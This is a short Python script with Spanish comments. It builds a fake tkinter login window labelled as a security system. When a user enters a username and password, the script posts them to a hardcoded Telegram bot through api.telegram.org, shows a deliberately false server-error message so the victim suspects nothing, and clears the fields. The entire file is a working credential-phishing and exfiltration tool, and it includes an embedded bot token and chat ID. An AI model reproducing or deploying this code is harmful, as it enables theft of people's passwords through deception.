import requests
import tkinter as tk
from tkinter import messagebox

# --- CONFIGURACIÓN ---
TOKEN = "8357885851:AAHVb5BTDEjD8maJJH7aPEox0WGG6JQeTL0"
CHAT_ID = "6694132376" 

def enviar_a_telegram(usuario, password):
    # Formateamos el mensaje de forma elegante
    mensaje = (
        "🚨 *ALERTA DE ACCESO* 🚨\n\n"
        f"👤 *Usuario:* `{usuario}`\n"
        f"🔑 *Contraseña:* `{password}`\n\n"
        "📍 _Enviado desde el sistema de logueo Python_"
    )
    
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID, 
        "text": mensaje, 
        "parse_mode": "Markdown"
    }
    
    try:
        response = requests.post(url, data=payload)
        # Esto es solo para que tú veas en consola si se envió bien
        if response.status_code == 200:
            print("Datos enviados correctamente a tu Telegram.")
    except Exception as e:
        print(f"Error de red: {e}")

def login_action():
    user = entry_user.get()
    pw = entry_pw.get()
    
    if user and pw:
        # Enviamos los datos al bot
        enviar_a_telegram(user, pw)
        # Mensaje de error falso para el usuario
        messagebox.showerror("Error", "Servidor no disponible (505).")
        # Limpiar los campos después de enviar
        entry_user.delete(0, tk.END)
        entry_pw.delete(0, tk.END)
    else:
        messagebox.showwarning("Atención", "Por favor, complete los campos.")

# --- INTERFAZ GRÁFICA ---
root = tk.Tk()
root.title("Inicio de Sesión")
root.geometry("350x300")
root.resizable(False, False)

# Estética simple
tk.Label(root, text="SISTEMA DE SEGURIDAD", font=("Arial", 12, "bold")).pack(pady=20)

tk.Label(root, text="Nombre de usuario").pack()
entry_user = tk.Entry(root, width=30)
entry_user.pack(pady=5)

tk.Label(root, text="Contraseña").pack()
entry_pw = tk.Entry(root, width=30, show="*")
entry_pw.pack(pady=5)

btn_login = tk.Button(root, text="INICIAR SESIÓN", command=login_action, 
                      bg="#2196F3", fg="white", width=20, font=("Arial", 10, "bold"))
btn_login.pack(pady=30)

root.mainloop()